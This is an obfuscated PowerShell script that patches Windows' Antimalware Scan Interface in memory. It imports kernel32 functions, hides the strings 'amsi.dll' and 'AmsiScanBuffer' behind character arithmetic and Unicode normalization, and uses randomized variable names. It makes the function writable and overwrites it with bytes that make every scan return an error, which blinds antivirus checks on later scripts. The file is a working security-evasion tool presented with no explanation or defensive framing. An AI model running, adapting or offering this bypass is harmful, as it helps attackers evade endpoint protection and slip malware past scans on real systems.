$hOAql2yhLu = @"
using System;
using System.Runtime.InteropServices;
public class hOAql2yhLu {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr niYJF, string ZMiIAU7uHL1egtJ);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr yWT5Byuxxh22i, UIntPtr A9kgv6kB, uint qPGXBRMgs3LXWT, out uint JtmRFVNko0b_61_8);
}
"@

Add-Type $hOAql2yhLu

$DAwfj22wy1tsevuah = [hOAql2yhLu]::LoadLibrary("$([ChAR](97*62/62)+[char](109*15/15)+[cHar](115*47/47)+[CHAr](105+49-49)+[Char]([ByTE]0x2e)+[chaR](100*95/95)+[Char]([bYte]0x6c)+[cHAr](1+107))")
$snkTvGOVHc = [hOAql2yhLu]::GetProcAddress($DAwfj22wy1tsevuah, "$(('Ä'+'m'+'s'+'î'+'S'+'c'+'â'+'n'+'B'+'û'+'f'+'f'+'è'+'r').NORMalize([cHAR](70+2-2)+[CHaR]([BYTE]0x6f)+[CHAR]([BytE]0x72)+[cHar]([bYtE]0x6d)+[CHaR](68*14/14)) -replace [cHAr]([BytE]0x5c)+[ChaR]([BYte]0x70)+[chAr]([BYtE]0x7b)+[ChAr]([bYTe]0x4d)+[Char]([ByTE]0x6e)+[CHar](125))")
$p = 0
[hOAql2yhLu]::VirtualProtect($snkTvGOVHc, [uint32]5, 0x40, [ref]$p)
$q2u50ifm9eoKYBZoGGm = "0xB8"
$sF11KZ = "0x57"
$DXeyGZINqH5y6uz = "0x00"
$prXFU_FAUo5iUV_zoi = "0x07"
$gHWcAM8BXX = "0x80"
$zC2ugA = "0xC3"
$PkX2dU = [Byte[]] ($q2u50ifm9eoKYBZoGGm,$sF11KZ,$DXeyGZINqH5y6uz,$prXFU_FAUo5iUV_zoi,+$gHWcAM8BXX,+$zC2ugA)
[System.Runtime.InteropServices.Marshal]::Copy($PkX2dU, 0, $snkTvGOVHc, 6)